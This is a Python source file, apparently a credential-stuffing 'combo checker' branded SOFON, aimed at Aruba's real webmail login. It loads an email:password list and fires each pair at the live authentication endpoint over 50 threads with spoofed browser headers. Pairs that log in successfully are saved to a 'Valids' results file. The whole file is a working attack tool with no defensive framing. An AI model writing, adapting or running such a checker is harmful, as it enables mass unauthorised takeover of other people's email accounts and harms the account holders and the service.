#!/usr/bin/python
# -*- coding: utf-8 -*-
#============== Modules ==============#
import os
import requests
from pyfiglet import Figlet
from rich.console import Console
from concurrent.futures import ThreadPoolExecutor
from rich import print
from datetime import datetime
import json
import ctypes
import sys
import tkinter as tk
from tkinter import filedialog

#============ Create Folder ===============#
try:
    os.mkdir('Results')
except:
    pass

total = 0
#===========================================#
class Bot():
    def __init__(self):
        self.valid = 0
        self.invalid = 0
        self.checked = 0

    def Checker(self, i):
        email, password = i.split(':')
        headers = {
            'authority': 'webmail.aruba.it',
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'origin': 'https://webmail.aruba.it',
            'referer': 'https://webmail.aruba.it/xfm.html',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0',
        }

        payload = {
            'login': email,
            'password': password,
            'lang': 'en',
            'customer': '',
            'theme': '',
            'service': 'leggera',
            'USEHTMLTPL': '',
            'login_way': '',
            'classicTheme': 'ext_aruba/classic',
        }

        try:
            response = requests.post('https://webmail.aruba.it/authenticate.php', headers=headers, data=payload)
            
            if "sessionid" in response.text:
                self.valid += 1
                print(f"[green][{datetime.now().strftime('%H:%M:%S')}] Login Success: {i} | By @anomsofoniyas [/green]")
                with open(f"Results/Aruba_Valids.txt", "a") as save_file:
                    save_file.write(f"{i}\n")
            else:
                self.invalid += 1
                print(f"[red][{datetime.now().strftime('%H:%M:%S')}] Login Failed : {i} | By @anomsofoniyas [/red]")
                with open("Results/Aruba_Invalids.txt", "a") as save_invalid:
                    save_invalid.write(f"{i}\n")

            self.checked += 1
            self.update_title()
        except Exception as e:
            print(e)
            self.update_title()

    def update_title(self):
        title = f"Valid : {self.valid} | Invalid : {self.invalid} | Checked : {self.checked}/{total} | SOFON"
        if os.name == 'nt':
            ctypes.windll.kernel32.SetConsoleTitleW(title)
        else:
            sys.stdout.write(f'\x1b]2;{title}\x07')

    def choose_file(self):
        root = tk.Tk()
        root.withdraw()
        file_path = filedialog.askopenfilename(title="Choose the Combo file to check")
        return file_path

if __name__ == '__main__':
    bot = Bot()
    console = Console()

    while True:
        os.system('cls' if os.name == 'nt' else 'clear')
        f = Figlet(font="standard")
        console.print(f.renderText("SOFON"), style="green")
        console.print("[bold magenta]By SOFON | @anomsofoniyas |  [/bold magenta]")
        console.print('')

        try:
            inpFile = bot.choose_file()
            threads = []
            with open(inpFile) as NumList:
                argFile = NumList.read().splitlines()
                total = len(argFile)
            with ThreadPoolExecutor(max_workers=50) as executor:  # Defaulted to 50 threads
                for data in argFile:
                    threads.append(executor.submit(bot.Checker, data.strip()))

            # Wait for all threads to complete
            for thread in threads:
                thread.result()

            bot.update_title()
        except Exception as e:
            console.print(e)

        console.print('\n')
        input("Press Enter to exit...")
        break